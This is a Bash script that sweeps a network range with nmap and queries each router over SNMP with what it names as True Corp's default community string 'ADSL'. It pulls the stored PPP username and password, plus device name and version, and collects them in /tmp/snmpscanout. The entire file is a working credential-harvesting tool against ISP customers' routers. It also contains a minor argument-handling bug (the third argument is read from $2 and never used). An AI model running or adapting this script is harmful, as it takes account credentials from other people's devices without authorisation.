#!/bin/bash

# This script scans all addresses in the input network,
# then grep for username and password. 
# This script relies on 'nmap' and 'snmpwalk' program, and super-user priviledge for nmap.
#
# author Anidear
#

if [ $# -lt 1 ]; then
	echo "Usage: snmpscan ipaddress/netmask [community_string] [grep_string]"
	echo "Ex. snmpscan 192.168.1.0/24"
	echo "Ex. snmpscan 192.168.1.0/24 ADSL"
	echo "Ex. snmpscan 192.168.1.0/24 ADSL truehisp"
	exit 1
else
	iprange=$1
fi

if [ $# -ge 2 ]; then
	community_string=$2
else
	# default community string of True Corp is ADSL
	community_string='ADSL' 
fi

if [ $# -ge 3 ]; then
	grep_string=$2
else
	# default grep string for True Corp's password is truehisp
	grep_string='truehisp'
fi

echo "Scanning $iprange"
#nmap -n -sS -p 161,162,10161,10162 $iprange | grep 'for' | sed  's/\(^.*(\)\|)//g' > /tmp/snmpscanIP
#nmap -n -PS161,162,10161,10162 -sn $iprange | grep 'for' | cut -d' ' -f5 > /tmp/snmpscanIP
#iplist=$( nmap -n -sU -p 161 $iprange | grep -B3 -E 'open|filtered' | grep 'for' | cut -d' ' -f5 )
iplist=$( nmap -n -sL $iprange | grep 'for' | cut -d' ' -f5 )
echo "scan completed."


snmp_query(){
	local query=$1
	local result=$(snmpwalk -r 0 -t 1 -c $community_string -v 1 $ip $query 2>/dev/null | grep -vi 'N/A' )
	# sanitize 
	result=$(echo -n $result | cut -d' ' -f4- | sed 's/[\r\n]//g' | sed 's/\([^"]\)$/\1"/' )
	echo $result
}

echo "clean file /tmp/snmpscanout"
>/tmp/snmpscanout

echo "start enumerating all IP"
for ip in $iplist; do

	echo "[*] snmp scan on $ip" 

	# check if change of IP class
	if [ "$ipclass" != "$( echo -n $ip|cut -d'.' -f3 )" ]; then 
		ipclass=$( echo -n $ip|cut -d'.' -f3 )
		# adding a splitter between each IP class
		echo '-------' >> /tmp/snmpscanout
	fi

	# query for username & password
	username=$( snmp_query iso.3.6.1.2.1.10.23.2.3.1.5 )
	if [ $username ]; then 
		password=$( snmp_query iso.3.6.1.2.1.10.23.2.3.1.6 )

		# query for hw name
		hwname=$( snmp_query iso.3.6.1.2.1.1.5 )

		# query for hw version
		hwversion=$( snmp_query iso.3.6.1.2.1.1.1 )

		# save result
		echo -e "$ip\t$username\t$password\t$hwname\t$hwversion" >> /tmp/snmpscanout
		echo -e "\e[01;32m[+] result from $ip is saved.\e[00m"
	else
		# no result
		echo -e "\e[00;30m[-] no result.\e[00m"
	fi
done

echo "finish."

echo '-----------------------------'
cat /tmp/snmpscanout
echo '-----------------------------'
echo "output is also stored at /tmp/snmpscanout."
